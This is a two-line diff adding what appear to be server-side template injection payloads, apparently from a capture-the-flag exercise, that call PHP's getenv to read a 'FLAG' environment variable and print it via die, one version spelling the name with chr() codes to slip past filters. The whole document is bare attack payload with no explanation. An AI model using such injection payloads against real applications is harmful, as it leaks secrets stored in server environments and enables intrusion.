@@ -1,0 +1,2 @@
+{die(getenv(chr(70).chr(76).chr(65).chr(71)))}
+{die(getenv(FLAG))}
